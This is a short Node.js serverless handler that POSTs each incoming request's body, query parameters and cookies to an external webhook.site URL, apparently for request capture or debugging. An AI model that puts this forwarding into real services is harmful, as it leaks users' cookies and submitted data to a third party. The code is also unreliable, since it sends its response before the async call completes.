const got = require('got');

module.exports = (req, res) => {
  let result

  (async () => {
    try {
      const {body} = await got.post('https://webhook.site/9e6e3d2f-3614-4ba0-90e2-1f320192f561', {
        json: {
          body: req.body,
          query: req.query,
          cookies: req.cookies,
        },
        responseType: 'json'
      });

      result = body
    } catch (err) {
      result = 'Somthing went really bad :' + err
    }
  })();

  res.send(result)
}

